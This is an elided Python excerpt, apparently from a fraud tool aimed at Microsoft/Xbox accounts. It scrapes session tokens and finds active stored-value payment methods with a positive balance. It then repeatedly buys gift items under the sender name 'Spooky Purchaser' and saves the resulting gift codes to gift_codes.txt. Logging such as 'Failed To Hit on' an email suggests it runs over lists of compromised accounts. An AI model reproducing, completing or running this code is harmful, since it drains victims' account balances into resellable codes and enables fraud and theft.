...
"t": accountXbox.split('id="t" value="')[1].split('"')[0]}
    ...
    def getPaymentMethods(self):
        ...
        for pm in getPMMethods:
            ...
            if pm["paymentMethod"]["paymentMethodType"]=="stored_value" and pm['status']=="Active":

                  bal = pm.get('details', {}).get('balance', 0.0)
                  if not float(bal) > 0.0: continue
                  info = getinfo(self.auth_session)
                  extra = pm

                  locale = info["msaDisplayLanguage"] if not info["msaPreferredLanguages"] else info["msaPreferredLanguages"][0]
    ...
    def fetchGiftCode(self,code,region,cartId:str):
        if code:
          with lock:
              open("gift_codes.txt","a").write(f"{code}|{region}\n")
          return
    ...
    def purchase(self,pi_id:str,market:str, locale):
        self.market = market.lower()
        self.locale = locale or f"en-{market}"
    ...
    'items': [
        {
            ...
            'giftee': {
                ...
                'gifteeSenderName': 'Spooky Purchaser',
                'gifteeType': 'email',
                'gifteeGamertag': '',
            },
        },
 ...
 'purchaseOrderId': self.cartId}),
    ...
    'itemsToAdd': {},
        ...
        if cart:
            if not cart.get('readyToPurchase'):
                ...
                code = None
                try:    
                  for item in purchaseResponse['cart']['lineItems']:
                    for token in item['fulfillmentStates']:
                      code = token["token5x5Value"]
                      break
                    break
                except:
                  pass
                self.fetchGiftCode(code, market, cart.get('id'))
            else:
                Logger.Sprint('FAILED',f"Failed To Hit on {self.email} -> Order In Pending State",Fore.LIGHTYELLOW_EX)
            self.purchaseditem += 1    
            return "purchased"
    ...
    def run(self):
        ...
        for inst in instruments:
            while True:
                purchase = self.purchase(inst['id'],inst['market'], inst['locale'])
